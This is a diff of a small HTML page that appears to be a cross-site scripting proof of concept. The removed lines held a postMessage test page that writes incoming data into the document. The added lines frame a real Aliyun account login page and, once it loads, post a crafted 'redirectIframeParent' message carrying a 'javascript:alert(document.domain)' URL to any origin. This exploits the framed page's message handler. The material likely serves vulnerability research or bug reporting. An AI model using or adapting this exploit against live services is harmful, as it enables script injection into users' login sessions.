@@ -1,20 +1,36 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>My Page</title>
-  </head>
-  <body>
-    <h1 style="font-family:Monospace; text-align:center;">Post message testing!!!</h1>
-    <script>
-  window.addEventListener("message", event => {
-    if (event.origin !== "http://testphp.vulnweb.com") return;
-    run(event.data);
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Iframe PostMessage Example</title>
+</head>
+<body>
+
+<iframe
+  id="myIframe"
+  src="https://account-cn.aliyun.com?mini_login_embedder=true"
+  width="800"
+  height="500"
+  style="border:1px solid #ccc">
+</iframe>
+
+<script>
+  const iframe = document.getElementById("myIframe");
+
+  const message2 = {
+    action: "redirectIframeParent",
+    payload: {
+      url: "javascript:alert(document.domain)"
+    }
+  };
+
+  const encodedData2 = encodeURIComponent(JSON.stringify(message2));
+
+  // Send message immediately after iframe loads
+  iframe.addEventListener("load", () => {
+    iframe.contentWindow.postMessage(encodedData2, "*");
   });
 </script>
-    <script>function run(test){
- document.write(test);
-  alert("haha");
-    
-}</script>
-  </body>
+
+</body>
 </html>
